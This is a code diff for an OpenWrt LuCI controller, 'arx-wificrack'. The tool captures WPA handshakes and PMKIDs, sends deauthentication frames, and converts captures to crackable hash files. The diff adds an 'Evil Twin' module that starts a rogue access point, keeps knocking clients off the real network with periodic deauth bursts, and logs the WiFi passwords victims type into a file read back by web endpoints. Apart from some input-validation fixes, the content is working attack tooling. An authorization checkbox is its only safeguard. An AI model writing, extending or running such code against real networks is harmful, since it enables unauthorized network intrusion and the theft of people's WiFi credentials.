@@ -4,6 +4,11 @@ local nixio = require "nixio"
 
 module("luci.controller.arx.wificrack", package.seeall)
 
+do
+	local pid = (nixio.getpid and nixio.getpid()) or 0
+	math.randomseed((os.time() % 2147483647) + (pid % 65536) * 17 + 12345)
+end
+
 local CAPTURE_DIR  = "/tmp/arx-wificrack"
 local HISTORY_DIR  = "/tmp/arx-wificrack/history"
 local PCAP_FILE    = CAPTURE_DIR .. "/capture.pcapng"
@@ -14,10 +19,21 @@ local TOOL_FILE    = CAPTURE_DIR .. "/tool.txt"
 local INFO_FILE    = CAPTURE_DIR .. "/target_info.txt"
 local TIMEOUT_FILE = CAPTURE_DIR .. "/timeout.txt"
 
+local ET_DIR    = "/tmp/arx-et"
+local ET_STATUS = ET_DIR .. "/status.txt"
+
+local function et_is_running()
+	if not nixio.fs.access(ET_STATUS) then return false end
+	local f = io.open(ET_STATUS, "r"); if not f then return false end
+	local s = f:read("*l"); f:close()
+	return s == "running"
+end
+
 function index()
 	if not nixio.fs.access("/etc/config/arx-wificrack") then return end
 	entry({"admin","arx-wificrack"}, alias("admin","arx-wificrack","capture"), _("WiFi 抓包"), 50).dependent = false
-	entry({"admin","arx-wificrack","capture"},  template("arx-wificrack/capture"), _("握手包捕获"), 10).leaf = true
+	entry({"admin","arx-wificrack","capture"},   template("arx-wificrack/capture"),    _("握手包捕获"), 10).leaf = true
+	entry({"admin","arx-wificrack","evil_twin"}, template("arx-wificrack/evil_twin"),  _("Evil Twin"), 20).leaf = true
 	entry({"admin","arx-wificrack","scan"},      call("action_scan")).leaf = true
 	entry({"admin","arx-wificrack","start"},     call("action_start")).leaf = true
 	entry({"admin","arx-wificrack","stop"},      call("action_stop")).leaf = true
@@ -30,6 +46,12 @@ function index()
 	entry({"admin","arx-wificrack","history_dl"},call("action_history_dl")).leaf = true
 	entry({"admin","arx-wificrack","history_rm"},call("action_history_rm")).leaf = true
 	entry({"admin","arx-wificrack","verify"},    call("action_verify")).leaf = true
+	-- Evil Twin API
+	entry({"admin","arx-wificrack","et_start"},  call("action_et_start")).leaf = true
+	entry({"admin","arx-wificrack","et_stop"},   call("action_et_stop")).leaf = true
+	entry({"admin","arx-wificrack","et_status"}, call("action_et_status")).leaf = true
+	entry({"admin","arx-wificrack","et_creds"},  call("action_et_creds")).leaf = true
+	entry({"admin","arx-wificrack","et_creds_rm"},call("action_et_creds_rm")).leaf = true
 end
 
 -- ==================== 输入验证 ====================
@@ -78,8 +100,9 @@ end
 
 local function get_wifi_iface()
 	local iface = sys.exec("iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1"):gsub("%s+$","")
-	-- 验证接口名格式，防止注入
-	if iface == "" or not iface:match("^[%w]+$") then return "wlan0" end
+	-- H-4: 允许字母数字、连字符、下划线、点（覆盖 phy0-ap0、wlan0.1 等合法命名）
+	-- 仍拒绝空字符串、斜杠、分号等 shell 特殊字符
+	if iface == "" or not iface:match("^[%w%.%-_]+$") then return "wlan0" end
 	return iface
 end
 
@@ -139,13 +162,13 @@ local function save_to_history(info)
 	os.execute("mkdir -p "..HISTORY_DIR)
 	if not nixio.fs.access(HASH_FILE) then return end
 	local ts = os.time()
-	-- [HIGH-1] 限制 SSID 长度，确保文件名不超过合理范围；空 SSID 回退到 "unknown"
 	local raw_ssid = (info.ssid or ""):sub(1, 32)
 	local safe_ssid = raw_ssid:gsub("[^%w%-_]","_")
 	if safe_ssid == "" or safe_ssid:match("^_+$") then safe_ssid = "unknown" end
-	local name = string.format("%d_%s", ts, safe_ssid)
+	-- B-1: 时间戳 + SSID + PID + 随机数，避免同进程同秒内碰撞
+	local pid = (nixio.getpid and nixio.getpid()) or 0
+	local name = string.format("%d_%s_%d_%05d", ts, safe_ssid, pid, math.random(99999))
 	os.execute(string.format("cp %s %s/%s.22000 2>/dev/null", HASH_FILE, HISTORY_DIR, name))
-	-- 保存元信息
 	local mf = io.open(HISTORY_DIR.."/"..name..".info","w")
 	if mf then
 		mf:write(string.format("ssid=%s\nbssid=%s\ntool=%s\ntime=%d\n",
@@ -173,6 +196,7 @@ local SCAN_LOCK = CAPTURE_DIR .. "/scan.lock"
 
 function action_scan()
 	http.prepare_content("application/json")
+	if et_is_running() then http.write_json({error="Evil Twin 运行中，请先停止后再扫描"}); return end
 	if is_running() then http.write_json({error="正在抓包中，请先停止后再扫描"}); return end
 	-- 防止并发扫描：检查锁文件（mtime 超过 30 秒视为过期）
 	if nixio.fs.access(SCAN_LOCK) then
@@ -183,7 +207,8 @@ function action_scan()
 		end
 	end
 	os.execute("mkdir -p "..CAPTURE_DIR)
-	local lf = io.open(SCAN_LOCK, "w"); if lf then lf:write(tostring(os.time())); lf:close() end
+	-- L-5: 锁文件过期判断依赖 mtime，内容无需写入时间戳
+	local lf = io.open(SCAN_LOCK, "w"); if lf then lf:close() end
 
 	local networks = {}
 	local iface = ""
@@ -194,7 +219,11 @@ function action_scan()
 		for line in scan_raw:gmatch("[^\n]+") do
 			local bss = line:match("^BSS ([%x:]+)")
 			if bss then
-				if cur.bssid then table.insert(networks, cur) end
+				if cur.bssid then
+					local chn = tonumber(cur.channel) or 0
+					cur.band = (chn > 14) and "5" or "2.4"
+					table.insert(networks, cur)
+				end
 				cur = {bssid=bss, ssid="", signal=0, channel=0, security="OPEN"}
 			elseif cur.bssid then
 				local ssid = line:match("^%s+SSID: (.+)")
@@ -206,7 +235,11 @@ function action_scan()
 				if line:match("%s+WPA:") and cur.security=="OPEN" then cur.security="WPA" end
 			end
 		end
-		if cur.bssid then table.insert(networks, cur) end
+		if cur.bssid then
+			local chn = tonumber(cur.channel) or 0
+			cur.band = (chn > 14) and "5" or "2.4"
+			table.insert(networks, cur)
+		end
 		table.sort(networks, function(a,b) return a.signal > b.signal end)
 	end)
 
@@ -220,11 +253,13 @@ end
 
 function action_start()
 	http.prepare_content("application/json")
+	if et_is_running() then http.write_json({error="Evil Twin 运行中，请先停止"}); return end
 	if is_running() then http.write_json({error="已在抓包中"}); return end
 
 	local bssid   = http.formvalue("bssid") or ""
 	local channel = http.formvalue("channel") or "0"
-	local ssid    = http.formvalue("ssid") or "unknown"
+	local ssid    = (http.formvalue("ssid") or "unknown"):gsub("[%c]", ""):sub(1, 32)
+	if ssid == "" then ssid = "unknown" end
 	local tool    = http.formvalue("tool") or get_current_tool()
 	local timeout = tonumber(http.formvalue("timeout")) or 300
 
@@ -245,7 +280,7 @@ function action_start()
 	if timeout < 0 then timeout = 0 end
 	if timeout > 3600 then timeout = 3600 end
 
-	os.execute("rm -f "..PCAP_FILE.." "..HASH_FILE.." "..LOG_FILE)
+	os.execute("rm -f "..PCAP_FILE.." "..HASH_FILE.." "..LOG_FILE.." "..HASH_FILE..".converted")
 	os.execute("mkdir -p "..CAPTURE_DIR)
 	-- [M3] 清理上次 airodump 遗留的 .cap 文件，避免 action_stop 取到旧文件
 	local old_dir = nixio.fs.dir(CAPTURE_DIR)
@@ -311,18 +346,38 @@ function action_start()
 	end
 
 	-- [CRIT-1] 超时后台进程：用 flock 与 action_stop 互斥；wifi up 仅在 hcxdumptool 模式执行
-	-- 转换完成后写入 DONE 标记，防止 action_stop 再次重复转换覆盖结果
+	-- B-2: 检查 hcxpcapngtool 是否可用，不可用时写入错误日志，避免静默失败
+	local has_hcxpcapngtool = sys.exec("which hcxpcapngtool 2>/dev/null"):match("%S") ~= nil
 	if timeout > 0 then
 		local wifi_up_cmd = (tool == "hcxdumptool") and "wifi up 2>/dev/null;" or ""
-		os.execute(string.format(
-			"(sleep %d; flock /tmp/arx-wificrack-stop.lock sh -c '"
-			.. "pid=$(cat %s 2>/dev/null); rm -f %s; "
-			.. "[ -n \"$pid\" ] && { kill \"$pid\" 2>/dev/null; sleep 1; kill -9 \"$pid\" 2>/dev/null; }; "
-			.. "[ ! -f %s.converted ] && { hcxpcapngtool %s -o %s 2>/dev/null; touch %s.converted; }; "
-			.. "%s') &",
-			timeout, PID_FILE, PID_FILE,
-			HASH_FILE, PCAP_FILE, HASH_FILE, HASH_FILE,
-			wifi_up_cmd))
+		local conv_cmd
+		if has_hcxpcapngtool then
+			conv_cmd = "[ ! -f %s.converted ] && hcxpcapngtool %s -o %s 2>/dev/null && touch %s.converted; "
+		else
+			-- 未安装时不 touch .converted，便于安装工具后重试转换
+			conv_cmd = "echo '[ERROR] hcxpcapngtool not found' >> " .. LOG_FILE .. "; echo hcxpcapngtool_missing >> " .. LOG_FILE .. "; "
+		end
+		if has_hcxpcapngtool then
+			os.execute(string.format(
+				"(sleep %d; flock /tmp/arx-wificrack-stop.lock sh -c '"
+				.. "pid=$(cat %s 2>/dev/null); rm -f %s; "
+				.. "[ -n \"$pid\" ] && { kill \"$pid\" 2>/dev/null; sleep 1; kill -9 \"$pid\" 2>/dev/null; }; "
+				.. conv_cmd
+				.. "%s') &",
+				timeout, PID_FILE, PID_FILE,
+				HASH_FILE, PCAP_FILE, HASH_FILE, HASH_FILE,
+				wifi_up_cmd))
+		else
+			os.execute(string.format(
+				"(sleep %d; flock /tmp/arx-wificrack-stop.lock sh -c '"
+				.. "pid=$(cat %s 2>/dev/null); rm -f %s; "
+				.. "[ -n \"$pid\" ] && { kill \"$pid\" 2>/dev/null; sleep 1; kill -9 \"$pid\" 2>/dev/null; }; "
+				.. "%s"
+				.. "%s') &",
+				timeout, PID_FILE, PID_FILE,
+				conv_cmd,
+				wifi_up_cmd))
+		end
 	end
 
 	local desc = {hcxdumptool="hcxdumptool（自动 PMKID+deauth）", airodump="airodump-ng（经典抓包）", tcpdump="tcpdump（被动监听）"}
@@ -333,18 +388,13 @@ function action_stop()
 	http.prepare_content("application/json")
 	local info = read_info()
 
-	-- [CRIT-2] 用 flock 与超时后台进程互斥，kill 后直接 kill -9，不再同步 sleep 1 阻塞请求
+	-- [CRIT-2] 与超时任务同一把 flock，避免双 kill / PID 文件竞态（与 action_start 超时子 shell 一致）
 	if is_running() then
-		local f = io.open(PID_FILE,"r")
-		if f then
-			local pid = f:read("*l"); f:close()
-			if pid and pid:match("^%d+$") then
-				os.execute("kill "..pid.." 2>/dev/null")
-				-- 非阻塞：后台等待并强杀，不阻塞 HTTP 响应
-				os.execute("(sleep 1; kill -9 "..pid.." 2>/dev/null) &")
-			end
-		end
-		os.execute("rm -f "..PID_FILE)
+		os.execute(string.format(
+			"flock /tmp/arx-wificrack-stop.lock sh -c '"
+			.. "pid=$(cat %s 2>/dev/null); rm -f %s; "
+			.. "[ -n \"$pid\" ] && { kill \"$pid\" 2>/dev/null; sleep 1; kill -9 \"$pid\" 2>/dev/null; }'",
+			PID_FILE, PID_FILE))
 	end
 
 	-- airodump：停 monitor mode，找输出文件
@@ -371,7 +421,7 @@ function action_stop()
 					local path = CAPTURE_DIR.."/"..entry
 					local st = nixio.fs.stat(path)
 					local mt = (st and tonumber(st.mtime)) or 0
-					if mt >= best_mtime then
+					if mt > best_mtime then
 						best_mtime = mt
 						cap_file = path
 					end
@@ -396,14 +446,40 @@ function action_stop()
 	local wifi_ok = sys.exec("iw dev 2>/dev/null | grep -c Interface"):gsub("%s+$","")
 	local wifi_recovered = (tonumber(wifi_ok) or 0) > 0
 
+	local has_hcxpcapngtool = sys.exec("which hcxpcapngtool 2>/dev/null"):match("%S") ~= nil
+	local conversion_error = nil
+	local log_tail = ""
+	if nixio.fs.access(LOG_FILE) then
+		local lf = io.open(LOG_FILE, "r")
+		if lf then
+			log_tail = lf:read("*a") or ""
+			lf:close()
+		end
+	end
+	if log_tail:find("hcxpcapngtool_missing", 1, true) or log_tail:find("hcxpcapngtool not found", 1, true) then
+		conversion_error = conversion_error or "hcxpcapngtool_missing"
+	end
+
 	-- 转换（用 flock 与超时进程互斥，并检查 .converted 标记避免重复覆盖）
 	local converted = false
 	if nixio.fs.access(PCAP_FILE) then
-		os.execute(string.format(
-			"flock /tmp/arx-wificrack-stop.lock sh -c '"
-			.. "[ ! -f %s.converted ] && { hcxpcapngtool %s -o %s 2>/dev/null; touch %s.converted; }'",
-			HASH_FILE, PCAP_FILE, HASH_FILE, HASH_FILE))
-		converted = nixio.fs.access(HASH_FILE) and true or false
+		if has_hcxpcapngtool then
+			os.execute(string.format(
+				"flock /tmp/arx-wificrack-stop.lock sh -c '"
+				.. "[ ! -f %s.converted ] && hcxpcapngtool %s -o %s 2>/dev/null && touch %s.converted'",
+				HASH_FILE, PCAP_FILE, HASH_FILE, HASH_FILE))
+			converted = nixio.fs.access(HASH_FILE) and true or false
+			if not converted then
+				conversion_error = conversion_error or "conversion_failed"
+			end
+		else
+			os.execute(string.format(
+				"flock /tmp/arx-wificrack-stop.lock sh -c '"
+				.. "echo hcxpcapngtool_missing >> %s; echo '[ERROR] hcxpcapngtool not found' >> %s'",
+				LOG_FILE, LOG_FILE))
+			conversion_error = "hcxpcapngtool_missing"
+			converted = false
+		end
 	end
 
 	local pmkid, eapol = parse_capture_stats()
@@ -424,9 +500,16 @@ function action_stop()
 			wifi_status=wifi_status, wifi_recovered=wifi_recovered
 		})
 	else
+		local msg = "已停止，未捕获到有效握手包"
+		if conversion_error == "hcxpcapngtool_missing" then
+			msg = msg .. "（未安装 hcxpcapngtool，无法从 pcap 生成 .22000；请安装 hcxtools 或手动转换）"
+		elseif conversion_error == "conversion_failed" and nixio.fs.access(PCAP_FILE) then
+			msg = msg .. "（hcxpcapngtool 已运行但未生成有效哈希，可能 pcap 中无握手/PMKID）"
+		end
 		http.write_json({
-			ok=true, message="已停止，未捕获到有效握手包", has_file=false,
-			wifi_status=wifi_status, wifi_recovered=wifi_recovered
+			ok=true, message=msg, has_file=false,
+			wifi_status=wifi_status, wifi_recovered=wifi_recovered,
+			conversion_error=conversion_error
 		})
 	end
 end
@@ -452,8 +535,22 @@ function action_deauth()
 	if count > 100 then count = 100 end
 
 	local iface = get_wifi_iface()
-	local mon = iface.."mon"
-	if not sys.exec("iw dev "..mon.." info 2>/dev/null"):match("%S") then mon=iface end
+	-- 与 airodump 流程一致：仅允许 monitor 接口，禁止回退到 STA 口以免 aireplay 行为不可预期
+	local mon
+	local iw_check = sys.exec("iw dev 2>/dev/null") or ""
+	for ifn in iw_check:gmatch("Interface%s+(%S+)") do
+		if ifn:match("mon$") and ifn:match("^[%w]+$") then mon = ifn; break end
+	end
+	if not mon then
+		local cand = iface .. "mon"
+		if cand:match("^[%w]+$") and sys.exec("iw dev " .. cand .. " info 2>/dev/null"):match("%S") then
+			mon = cand
+		end
+	end
+	if not mon then
+		http.write_json({ error = "未找到 monitor 接口，请先通过 airodump 抓包流程进入监听模式" })
+		return
+	end
 
 	-- [C2] bssid/client 已验证格式，count 已限制范围
 	os.execute(string.format(
@@ -520,7 +617,9 @@ end
 -- 验证握手包质量
 function action_verify()
 	http.prepare_content("application/json")
-	local file = http.formvalue("file") or HASH_FILE
+	-- Lua 中空字符串为真值，不能与 or HASH_FILE 混用，否则 base 为 nil 会崩溃
+	local fv = http.formvalue("file")
+	local file = (fv and fv ~= "") and fv or HASH_FILE
 
 	-- [S2] 严格路径验证：先对文件名做白名单检查，再用 realpath 规范化
 	-- 只允许 CAPTURE_DIR 或 HISTORY_DIR 下的 .22000 文件
@@ -605,14 +704,18 @@ function action_history()
 					mf:close()
 				end
 				info.time = tonumber(info.time) or 0
-				-- [MED-7] 限制单个历史文件读取行数，防止大文件导致内存压力
-				local MAX_HASH_LINES = 50000
+				-- 全文件统计 PMKID/EAPOL；极长文件设硬上限，避免单次请求耗时过长
+				local MAX_HASH_LINES = 200000
+				info.hash_stats_truncated = false
 				local hf = io.open(path,"r")
 				if hf then
 					local n = 0
 					for line in hf:lines() do
 						n = n + 1
-						if n > MAX_HASH_LINES then break end
+						if n > MAX_HASH_LINES then
+							info.hash_stats_truncated = true
+							break
+						end
 						if line:match("^WPA%*01%*") then info.pmkid=info.pmkid+1
 						elseif line:match("^WPA%*02%*") then info.eapol=info.eapol+1 end
 					end
@@ -664,15 +767,214 @@ end
 function action_delete()
 	http.prepare_content("application/json")
 	if is_running() then http.write_json({error="请先停止抓包"}); return end
-	-- [H4] 用 nixio.fs.dir 遍历删除，避免 glob 在目录不存在时行为不一致
+	-- L-3: 精确匹配已知文件名，避免 *.txt 通配误删未来新增的 txt 文件
+	local known_files = {
+		PCAP_FILE, HASH_FILE, LOG_FILE,
+		TOOL_FILE, INFO_FILE, TIMEOUT_FILE,
+		CAPTURE_DIR .. "/target.txt",
+		HASH_FILE .. ".converted",
+	}
+	for _, path in ipairs(known_files) do
+		nixio.fs.remove(path)
+	end
+	-- 同时清理 airodump 输出文件（动态命名）
 	local dir = nixio.fs.dir(CAPTURE_DIR)
 	if dir then
 		for entry in dir do
-			if entry:match("%.pcapng$") or entry:match("%.22000$")
-			   or entry:match("%.log$") or entry:match("%.txt$") then
+			if entry:match("^airodump%-.*%.cap$") or entry:match("^airodump%-.*%.pcapng$") then
 				nixio.fs.remove(CAPTURE_DIR.."/"..entry)
 			end
 		end
 	end
+	http.write_json({ok=true})
+end
+
+-- ==================== Evil Twin ====================
+
+local ET_CREDS       = ET_DIR .. "/creds.txt"
+local ET_LOG         = ET_DIR .. "/et.log"
+local ET_AP_IFACE    = ET_DIR .. "/ap_iface.txt"
+local ET_HANDSHAKE   = ET_DIR .. "/handshake.22000"
+local ET_SUBMIT_ST   = ET_DIR .. "/submit_state.txt"
+local ET_DEAUTH_PID  = ET_DIR .. "/deauth.pid"
+
+local function et_read_status()
+	if not nixio.fs.access(ET_STATUS) then return "stopped" end
+	local f = io.open(ET_STATUS, "r"); if not f then return "stopped" end
+	local s = f:read("*l"); f:close()
+	return s or "stopped"
+end
+
+local function et_uci_opts()
+	local max_rt, di, db = 1800, 5, 3
+	local ok, umod = pcall(require, "luci.model.uci")
+	if ok and umod and umod.cursor then
+		local c = umod.cursor()
+		local mr = tonumber(c:get("arx-wificrack", "evil_twin", "max_runtime"))
+		if mr and mr >= 0 and mr <= 86400 then max_rt = mr end
+		local d1 = tonumber(c:get("arx-wificrack", "evil_twin", "deauth_interval"))
+		if d1 and d1 >= 2 and d1 <= 120 then di = d1 end
+		local d2 = tonumber(c:get("arx-wificrack", "evil_twin", "deauth_burst"))
+		if d2 and d2 >= 1 and d2 <= 20 then db = d2 end
+	end
+	return max_rt, di, db
+end
+
+local function et_read_submit_state()
+	if not nixio.fs.access(ET_SUBMIT_ST) then return "none" end
+	local f = io.open(ET_SUBMIT_ST, "r"); if not f then return "none" end
+	local s = f:read("*l"); f:close()
+	return (s or "none"):gsub("%s+$", "")
+end
+
+local function et_deauth_active()
+	if not nixio.fs.access(ET_DEAUTH_PID) then return false end
+	local f = io.open(ET_DEAUTH_PID, "r"); if not f then return false end
+	local pid = f:read("*l"); f:close()
+	if not pid or not pid:match("^%d+$") then return false end
+	return nixio.fs.access("/proc/" .. pid) and true or false
+end
+
+local function et_write_txt(path, val)
+	local f = io.open(path, "w"); if f then f:write(tostring(val)); f:close() end
+end
+
+-- 读取捕获的凭据列表（格式: 时间 | 密码 | 状态）
+local function et_read_creds()
+	local creds = {}
+	if not nixio.fs.access(ET_CREDS) then return creds end
+	local f = io.open(ET_CREDS, "r")
+	if not f then return creds end
+	for line in f:lines() do
+		local p1 = line:find(" | ", 1, true)
+		if p1 then
+			local ts = line:sub(1, p1 - 1):gsub("%s+$", "")
+			local rem = line:sub(p1 + 3)
+			local p2 = rem:find(" | ", 1, true)
+			local pw, status
+			if p2 then
+				pw = rem:sub(1, p2 - 1)
+				status = rem:sub(p2 + 3):gsub("%s+$", "")
+			else
+				pw = rem:gsub("%s+$", "")
+				status = "legacy"
+			end
+			table.insert(creds, {time = ts, password = pw, status = status})
+		end
+	end
+	f:close()
+	return creds
+end
+
+function action_et_start()
+	http.prepare_content("application/json")
+	if et_is_running() then http.write_json({error="Evil Twin 已在运行中"}); return end
+	if is_running() then http.write_json({error="握手包抓包进行中，请先停止"}); return end
+
+	if (http.formvalue("auth_ack") or "") ~= "1" then
+		http.write_json({error="请勾选授权确认"}); return
+	end
+
+	local ssid    = http.formvalue("ssid") or ""
+	local bssid   = http.formvalue("bssid") or ""
+	local channel = http.formvalue("channel") or "6"
+	local use_cap = (http.formvalue("use_capture_hash") or "") == "1"
+
+	if ssid == "" then http.write_json({error="请提供目标 SSID"}); return end
+	if not validate_mac(bssid) then http.write_json({error="BSSID 格式无效"}); return end
+	if not validate_channel(channel) then http.write_json({error="信道号无效"}); return end
+	channel = tostring(math.floor(tonumber(channel)))
+
+	if #ssid > 32 then http.write_json({error="SSID 过长"}); return end
+
+	local iface = get_wifi_iface()
+	local ap_iface = iface .. "ap"
+
+	os.execute("mkdir -p " .. ET_DIR)
+	os.execute("rm -f " .. ET_CREDS .. " " .. ET_LOG)
+
+	if use_cap and nixio.fs.access(HASH_FILE) then
+		os.execute(string.format("cp %s %s 2>/dev/null", HASH_FILE, ET_HANDSHAKE))
+	else
+		os.execute("rm -f " .. ET_HANDSHAKE)
+	end
+
+	local max_rt, di, db = et_uci_opts()
+	et_write_txt(ET_DIR .. "/max_runtime.txt", max_rt)
+	et_write_txt(ET_DIR .. "/deauth_interval.txt", di)
+	et_write_txt(ET_DIR .. "/deauth_burst.txt", db)
+
+	local ssid_file = ET_DIR .. "/start_ssid.txt"
+	local sf = io.open(ssid_file, "w")
+	if sf then sf:write(ssid); sf:close() end
+
+	os.execute(string.format(
+		"sh /usr/bin/arx-et.sh start \"$(cat %s)\" %s %s %s %s >> %s 2>&1 &",
+		ssid_file, bssid, channel, iface, ap_iface, ET_LOG))
+
+	local msg = "Evil Twin 启动中，目标: " .. ssid
+	if use_cap and nixio.fs.access(ET_HANDSHAKE) then
+		msg = msg .. "（已关联 capture.22000，可校验密码）"
+	elseif use_cap then
+		msg = msg .. "（未找到 capture.22000，仅演示模式二次放行）"
+	end
+	http.write_json({ok=true, message=msg})
+end
+
+function action_et_stop()
+	http.prepare_content("application/json")
+	os.execute("sh /usr/bin/arx-et.sh stop >> " .. ET_LOG .. " 2>&1")
+	http.write_json({ok=true, message="Evil Twin 已停止"})
+end
+
+function action_et_status()
+	http.prepare_content("application/json")
+	local status = et_read_status()
+	local creds  = et_read_creds()
+	local submit_st = et_read_submit_state()
+	local deauth_on = et_deauth_active()
+	local has_hs = nixio.fs.access(ET_HANDSHAKE) and true or false
+	local cap_hs = nixio.fs.access(HASH_FILE) and true or false
+
+	local log = ""
+	if nixio.fs.access(ET_LOG) then
+		local lf = io.open(ET_LOG, "r")
+		if lf then
+			local all = lf:read("*a") or ""; lf:close()
+			local lines = {}
+			for l in all:gmatch("[^\r\n]+") do table.insert(lines, l) end
+			local tail = {}
+			for i = math.max(1, #lines - 9), #lines do table.insert(tail, lines[i]) end
+			log = table.concat(tail, "\n")
+		end
+	end
+
+	local ap_iface = ""
+	local af = io.open(ET_AP_IFACE, "r")
+	if af then ap_iface = af:read("*l") or ""; af:close() end
+
+	http.write_json({
+		status               = status,
+		running              = (status == "running"),
+		cred_count           = #creds,
+		latest               = creds[#creds] or nil,
+		log                  = log,
+		ap_iface             = ap_iface,
+		submit_state         = submit_st,
+		deauth_active        = deauth_on,
+		has_handshake        = has_hs,
+		capture_hash_available = cap_hs,
+	})
+end
+
+function action_et_creds()
+	http.prepare_content("application/json")
+	local creds = et_read_creds()
+	http.write_json({creds = creds})
+end
+
+function action_et_creds_rm()
+	http.prepare_content("application/json")
+	nixio.fs.remove(ET_CREDS)
 	http.write_json({ok=true})
 end
